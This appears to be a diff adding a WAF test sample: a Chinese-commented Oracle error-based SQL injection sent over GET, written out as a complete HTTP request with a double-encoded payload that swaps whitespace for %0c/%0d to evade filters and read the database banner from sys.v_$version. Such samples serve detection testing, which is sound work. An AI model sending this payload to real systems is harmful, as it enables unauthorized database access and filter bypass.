@@ -1,0 +1,9 @@
+# SQL注入_GET_oracle_报错注入(空白符替换绕过)-06506324
+# 攻击者基于union查询使用空白符替换进行绕过，将"dbms_xdb_version.checkin((select%0dbanner%0dfrom%0dsys.v_$version%0dwhere%0drownum=1))%0dis%0dnot%0dnull"语句注入到 SQL 查询参数中，从系统视图sys.v_$version查询数据库名称。
+GET /?id=1%250cand%250cdbms_xdb_version.checkin%28%28select%250dbanner%250dfrom%250dsys.v_$version%250dwhere%250drownum=1%29%29%250dis%250dnot%250dnull&bid=hd_tag_m8mv23zv HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv23zv
+RM-PRO-Token: 188212c5b6aa40f4bf24706e2a7344ab
+RM-PRO-Time: 1742808355224
+User-Agent: curl/7.83.1
+
